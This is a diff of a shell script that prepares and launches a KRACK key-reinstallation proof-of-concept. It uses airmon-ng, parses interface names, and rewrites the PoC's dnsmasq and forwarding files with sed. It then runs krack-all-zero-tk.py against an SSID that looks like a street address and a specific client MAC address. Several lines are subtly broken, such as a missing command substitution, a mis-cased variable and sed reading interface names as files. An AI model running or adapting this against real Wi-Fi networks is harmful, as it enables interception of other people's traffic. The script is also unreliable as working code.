@@ -28,8 +28,33 @@ sudo airmon-ng check kill
 
 #RUN: systool -vm ath9k_htc
 
-## To check: the nohwcript/.. param has been set.
+## Customise files:
 
-#Look for key reinstallations in the 4-way handshake
-#./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa
+
+
+# Set interface variables:
+wlan0=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==3' | tr -d ':')
+
+wlan1=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==4' | tr -d ':')
+
+eth0=ifconfig -a | sed 's/[ \t].*//;/^$/d' | awk 'FNR==1' | tr -d ':'
+
+
+
+# Replace hard-coded interface value in dnsmasq.conf
+sed -i "1s/.*/interface=$(sed '2q;d' $wlan1)/" ./krackattacks-poc-zerokey/krackattack/dnsmasq.conf
+
+# Replace hard-coded interface values in enable_internet_forwarding.sh
+
+#TODO should test whether we can use wlan1 0 to forward traffic, of it it's busy monitoring.
+sed -i "5s/.*/INTERNET=$(sed '5q;d' $eth0)/" ./krackattacks-poc-zerokey/krackattack/enable_internet
+
+sed -i "5s/.*/INTERNET=$(sed '7q;d' $WLAN1)/" ./krackattacks-poc-zerokey/krackattack/enable_internet
+
+
+
+## TODO To check: the nohwcript/.. param has been set.
+
+# TODO Look for key reinstallations in the 4-way handshake
+./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa
 
